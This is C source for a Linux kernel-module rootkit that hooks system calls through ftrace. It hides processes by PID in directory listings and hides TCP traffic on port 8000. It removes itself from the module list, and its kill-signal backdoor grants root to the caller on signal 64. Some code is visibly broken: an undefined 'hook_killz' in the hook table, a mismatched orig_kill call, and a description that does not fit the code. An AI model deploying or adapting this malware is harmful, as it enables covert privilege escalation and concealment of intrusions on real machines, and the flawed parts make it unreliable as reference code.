#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>
#include <linux/kallsyms.h>
#include <linux/dirent.h>
#include <linux/version.h>
#include <linux/tcp.h>

#include "ftrace_helper.h"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("TheXcellerator");
MODULE_DESCRIPTION("Hiding files that start with a certain prefix");
MODULE_VERSION("0.02");


//change defines to what you want
#define HIDE_PORT 8000


static asmlinkage long (*orig_tcp4_seq_show)(struct seq_file *seq, void *v);

/* This is our hook function for tcp4_seq_show */
static asmlinkage long hook_tcp4_seq_show(struct seq_file *seq, void *v)
{
    struct inet_sock *is;
    long ret;
    unsigned short port = htons(HIDE_PORT);

    if (v != SEQ_START_TOKEN) {
		is = (struct inet_sock *)v;
		if (port == is->inet_sport || port == is->inet_dport) {
			printk(KERN_DEBUG "rootkit: sport: %d, dport: %d\n",
				   ntohs(is->inet_sport), ntohs(is->inet_dport));
			return 0;
		}
	}

	ret = orig_tcp4_seq_show(seq, v);
	return ret;
}


#if defined(CONFIG_X86_64) && (LINUX_VERSION_CODE >= KERNEL_VERSION(4,17,0))
#define PTREGS_SYSCALL_STUBS 1
#endif

char hide_pid[NAME_MAX];
char port_pid[NAME_MAX];
static struct list_head *prev_module;
static short hidden = 0;

#ifdef PTREGS_SYSCALL_STUBS
static asmlinkage long (*orig_getdents64)(const struct pt_regs *);
static asmlinkage long (*orig_getdents)(const struct pt_regs *);
static asmlinkage long (*orig_kill)(const struct pt_regs *);

asmlinkage int hook_getdents64(const struct pt_regs *regs)
{
    struct linux_dirent64 __user *dirent = (struct linux_dirent64 *)regs->si;

    long error;

    struct linux_dirent64 *current_dir, *dirent_ker, *previous_dir = NULL;
    unsigned long offset = 0;

    int ret = orig_getdents64(regs);
    dirent_ker = kzalloc(ret, GFP_KERNEL);

    if ( (ret <= 0) || (dirent_ker == NULL) )
        return ret;

    error = copy_from_user(dirent_ker, dirent, ret);
    if (error)
        goto done;

    while (offset < ret)
    {
        current_dir = (void *)dirent_ker + offset;

        if ( (memcmp(hide_pid, current_dir->d_name, strlen(hide_pid)) == 0) && (strncmp(hide_pid, "", NAME_MAX) != 0) )
        {
            if ( current_dir == dirent_ker )
            {
                ret -= current_dir->d_reclen;
                memmove(current_dir, (void *)current_dir + current_dir->d_reclen, ret);
                continue;
            }
            previous_dir->d_reclen += current_dir->d_reclen;
        }
        else
        {
            previous_dir = current_dir;
        }

        offset += current_dir->d_reclen;
    }

    error = copy_to_user(dirent, dirent_ker, ret);
    if (error)
        goto done;

done:
    kfree(dirent_ker);
    return ret;

}

asmlinkage int hook_getdents(const struct pt_regs *regs)
{
    struct linux_dirent {
        unsigned long d_ino;
        unsigned long d_off;
        unsigned short d_reclen;
        char d_name[];
    };

    struct linux_dirent *dirent = (struct linux_dirent *)regs->si;
    long error;

    struct linux_dirent *current_dir, *dirent_ker, *previous_dir = NULL;
    unsigned long offset = 0;

    int ret = orig_getdents(regs);
    dirent_ker = kzalloc(ret, GFP_KERNEL);

    if ( (ret <= 0) || (dirent_ker == NULL) )
        return ret;

    error = copy_from_user(dirent_ker, dirent, ret);
    if (error)
        goto done;

    while (offset < ret)
    {
        current_dir = (void *)dirent_ker + offset;

        if ( (memcmp(hide_pid, current_dir->d_name, strlen(hide_pid)) == 0) && (strncmp(hide_pid, "", NAME_MAX) != 0) )
        {
            if ( current_dir == dirent_ker )
            {
                ret -= current_dir->d_reclen;
                memmove(current_dir, (void *)current_dir + current_dir->d_reclen, ret);
                continue;
            }
            previous_dir->d_reclen += current_dir->d_reclen;
        }
        else
        {
            previous_dir = current_dir;
        }

        offset += current_dir->d_reclen;
    }

    error = copy_to_user(dirent, dirent_ker, ret);
    if (error)
        goto done;

done:
    kfree(dirent_ker);
    return ret;

}

asmlinkage int hook_kill(const struct pt_regs *regs)
{
    pid_t pid = regs->di;
    int sig = regs->si;

    void set_root(void);

    if ( sig == 64 )
    {
        printk(KERN_INFO "rootkit: giving root...\n");
        set_root();
        return 0;
    }

    if ( sig == 63 )
    {
        printk(KERN_INFO "rootkit: hiding process with pid %d\n", pid);
        sprintf(hide_pid, "%d", pid);
        return 0;
    }
    void showme(void);

    if ( sig == 62 )
    {
        if ( hidden == 1 )
        {
            printk(KERN_INFO "rootkit: showme enabled\n");
            showme();
        }
        else
        {
            printk(KERN_INFO "rootkit: showme already enabled\n");
        }
        return 0;
    }
    void hideme(void);

    if ( sig == 61 )
    {
        if ( hidden == 0 )
        {
            printk(KERN_INFO "rootkit: hideme enabled\n");
            hideme();
        }
        else
        {
            printk(KERN_INFO "rootkit: hideme already enabled\n");
        }
        return 0;
    }
    if ( sig == 60 )
    {
        printk(KERN_INFO "SIG                    Description\n");
        printk(KERN_INFO "---                    -----------\n");
        printk(KERN_INFO "60                     prints this\n");
        printk(KERN_INFO "61                     hides the rootkit (on by default)\n");
        printk(KERN_INFO "62                     shows the rootkit\n");
        printk(KERN_INFO "63                     hides a process based on the PID input of the kill command\n");
        printk(KERN_INFO "64                     gives root\n");
        return 0;
    }

    return orig_kill(pid, sig);

}
#else
static asmlinkage long (*orig_getdents64)(unsigned int fd, struct linux_dirent64 *dirent, unsigned int count);
static asmlinkage long (*orig_getdents)(unsigned int fd, struct linux_dirent *dirent, unsigned int count);
static asmlinkage long (*orig_kill)(pid_t pid, int sig);

static asmlinkage int hook_getdents64(unsigned int fd, struct linux_dirent64 *dirent, unsigned int count)
{
    struct linux_dirent64 *current_dir, *dirent_ker, *previous_dir = NULL;
    unsigned long offset = 0;

    int ret = orig_getdents64(fd, dirent, count);
    dirent_ker = kzalloc(ret, GFP_KERNEL);

    if ( (ret <= 0) || (dirent_ker == NULL) )
        return ret;

    long error;
        error = copy_from_user(dirent_ker, dirent, ret);
    if (error)
        goto done;

    while (offset < ret)
    {
        current_dir = (void *)dirent_ker + offset;

        if ( (memcmp(hide_pid, current_dir->d_name, strlen(hide_pid)) == 0) && (strncmp(hide_pid, "", NAME_MAX) != 0) )
        {
            if ( current_dir == dirent_ker )
            {
                ret -= current_dir->d_reclen;
                memmove(current_dir, (void *)current_dir + current_dir->d_reclen, ret);
                continue;
            }
            previous_dir->d_reclen += current_dir->d_reclen;
        }
        else
        {
            previous_dir = current_dir;
        }

        offset += current_dir->d_reclen;
    }

    error = copy_to_user(dirent, dirent_ker, ret);
    if (error)
        goto done;

done:
    kfree(dirent_ker);
    return ret;
}

static asmlinkage int hook_getdents(unsigned int fd, struct linux_dirent *dirent, unsigned int count)
{
    struct linux_dirent {
        unsigned long d_ino;
        unsigned long d_off;
        unsigned short d_reclen;
        char d_name[];
    };
    struct linux_dirent *current_dir, *dirent_ker, *previous_dir = NULL;
    unsigned long offset = 0;

    int ret = orig_getdents(fd, dirent, count);
    dirent_ker = kzalloc(ret, GFP_KERNEL);

    if ( (ret <= 0) || (dirent_ker == NULL) )
        return ret;

    long error;
        error = copy_from_user(dirent_ker, dirent, ret);
    if (error)
        goto done;

    while (offset < ret)
    {
        current_dir = (void *)dirent_ker + offset;

        if ( (memcmp(hide_pid, current_dir->d_name, strlen(hide_pid)) == 0) && (strncmp(hide_pid, "", NAME_MAX) != 0) )
        {
            if ( current_dir == dirent_ker )
            {
                ret -= current_dir->d_reclen;
                memmove(current_dir, (void *)current_dir + current_dir->d_reclen, ret);
                continue;
            }
            previous_dir->d_reclen += current_dir->d_reclen;
        }
        else
        {
            previous_dir = current_dir;
        }

        offset += current_dir->d_reclen;
    }

    error = copy_to_user(dirent, dirent_ker, ret);
    if (error)
        goto done;

done:
    kfree(dirent_ker);  
    return ret;
}

asmlinkage int hook_kill(pid_t pid, int sig)
{
    if ( sig == 65 )
    {

    }
    void set_root(void);

    if ( sig == 64 )
    {
        printk(KERN_INFO "rootkit: giving root...\n");
        set_root();
        return 0;
    }

    if ( sig == 63 )
    {
        printk(KERN_INFO "rootkit: hiding process with pid %d\n", pid);
        sprintf(hide_pid, "%d", pid);
        return 0;
    }
    void showme(void);

    if ( sig == 62 )
    {
        if ( hidden == 1 )
        {
            printk(KERN_INFO "rootkit: showme enabled\n");
            showme();
        }
        else
        {
            printk(KERN_INFO "rootkit: showme already enabled\n");
        }
        return 0;
    }
    void hideme(void);

    if ( sig == 61 )
    {
        if ( hidden == 0 )
        {
            printk(KERN_INFO "rootkit: hideme enabled\n");
            hideme();
        }
        else
        {
            printk(KERN_INFO "rootkit: hideme already enabled\n");
        }
        return 0;
    }
    if ( sig == 60 )
    {
        printk(KERN_INFO "SIG                    Description\n");
        printk(KERN_INFO "---                    -----------\n");
        printk(KERN_INFO "60                     prints this\n");
        printk(KERN_INFO "61                     hides the rootkit (on by default)\n");
        printk(KERN_INFO "62                     shows the rootkit\n");
        printk(KERN_INFO "63                     hides a process based on the PID input of the kill command\n");
        printk(KERN_INFO "64                     gives root\n");
        return 0;
    }

    return orig_kill(pid, sig);
}
#endif

void set_root(void)
{
    struct cred *root;
    root = prepare_creds();

    if (root == NULL)
        return;

    root->uid.val = root->gid.val = 0;
    root->euid.val = root->egid.val = 0;
    root->suid.val = root->sgid.val = 0;
    root->fsuid.val = root->fsgid.val = 0;

    commit_creds(root);
}

void showme(void)
{
    list_add(&THIS_MODULE->list, prev_module);
    hidden = 0;
}

void hideme(void)
{
    prev_module = THIS_MODULE->list.prev;
    list_del(&THIS_MODULE->list);
    hidden = 1;
}


static struct ftrace_hook hooks[] = {
#ifdef PTREGS_SYSCALL_STUBS
    HOOK("tcp4_seq_show", hook_tcp4_seq_show, &orig_tcp4_seq_show),
    HOOK("__x64_sys_kill", hook_killz, &orig_kill),
    HOOK("__x64_sys_getdents64", hook_getdents64, &orig_getdents64),
    HOOK("__x64_sys_getdents", hook_getdents, &orig_getdents),
#else 
    HOOK("tcp4_seq_show", hook_tcp4_seq_show, &orig_tcp4_seq_show),
    HOOK("sys_kill", hook_kill, &orig_kill),
    HOOK("sys_getdents64", hook_getdents64, &orig_getdents64),
    HOOK("sys_getdents", hook_getdents, &orig_getdents),
#endif
};

static int __init rootkit_init(void)
{
    int err;
    err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
    if(err)
        return err;

    printk(KERN_INFO "rootkit: Loaded >:-)\n");
    hideme();
    return 0;
}

static void __exit rootkit_exit(void)
{
    fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
    printk(KERN_INFO "rootkit: Unloaded :-(\n");
}

module_init(rootkit_init);
module_exit(rootkit_exit);